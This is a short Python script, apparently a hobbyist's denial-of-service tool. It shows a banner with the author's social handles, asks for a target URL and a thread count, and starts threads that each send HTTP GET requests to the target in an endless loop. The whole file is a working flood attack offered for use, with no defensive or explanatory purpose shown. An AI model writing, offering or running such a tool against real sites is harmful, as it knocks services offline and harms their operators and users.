import colorama
import threading
import requests
import time
print("TO STOP TYPE CTRL-C")
time.sleep(3)
huge_text = """
░█▀▀▄ ░█▀▀▀█ ░█▀▀▀█ ░█▀▀▀ ░█▀▀█ ▄█─ ░█▀▀▀█ ▀▄░▄▀ 
░█─░█ ░█──░█ ─▀▀▀▄▄ ░█▀▀▀ ░█▄▄▀ ─█─ ─▄▄▄▀▀ ─░█── 
░█▄▄▀ ░█▄▄▄█ ░█▄▄▄█ ░█─── ░█─░█ ▄█▄ ░█▄▄▄█ ▄▀░▀▄
                        My tiktok: @fr1zxxpython
                        My telegram: @Fr1zxX
                        My github: https://github.com/Fr1zx
"""

print(colorama.Fore.BLUE+ huge_text)
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
threads = 20

url = input("URL adress: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!") 
